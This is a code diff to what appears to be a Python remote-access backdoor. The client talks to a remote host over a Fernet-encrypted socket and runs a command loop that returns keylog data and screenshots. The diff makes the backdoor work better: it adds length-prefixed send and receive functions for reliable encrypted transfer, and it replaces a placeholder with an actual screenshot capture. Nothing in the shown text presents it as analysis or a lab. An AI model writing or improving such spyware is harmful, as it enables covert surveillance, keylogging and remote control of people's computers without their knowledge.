@@ -24,21 +24,25 @@ cipher = Fernet(psk_aes)  # Create a Fernet cipher object for encryption
 def reliable_send(data):
     jsondata = json.dumps(data)  # Convert data to JSON format
     encrypted_data = cipher.encrypt(jsondata.encode())  # Encrypt the JSON data *added*
-    s.send(encrypted_data)  # Send the encrypted data over the network
+    data_len = len(encrypted_data)
+    s.sendall(data_len.to_bytes(4, 'big'))  # Send 4-byte length prefix
+    s.sendall(encrypted_data)
 
 
 # Function to receive data in a reliable way (expects JSON data)
 def reliable_recv():
-    data = b''  # Initialize an empty byte string to hold received data
-    while True:
-        try:
-            data += s.recv(1024)  # Receive data in chunks of 1024 bytes
-            if not data:
-                continue
-            decrypted_data = cipher.decrypt(data)  # Decrypt the received data *added*
-            return json.loads(decrypted_data.decode())  # Parse the received JSON data
-        except ValueError:
-            continue
+    data_len_bytes = s.recv(4)
+    if not data_len_bytes:
+        return None
+    data_len = int.from_bytes(data_len_bytes, 'big')
+    data = b''
+    while len(data) < data_len:
+        packet = s.recv(data_len - len(data))
+        if not packet:
+            return None
+        data += packet
+    decrypted_data = cipher.decrypt(data)
+    return json.loads(decrypted_data.decode())
 
 
 # Function to establish a connection to a remote host
@@ -165,7 +169,7 @@ def shell():
             reliable_send(log_data)
         elif command == 'screenshot':
             # If the command is 'screenshot', take a screenshot and send it
-            screenshot_data = "hehe"
+            screenshot_data = take_screenshot()
             reliable_send(screenshot_data)
         else:
             try:
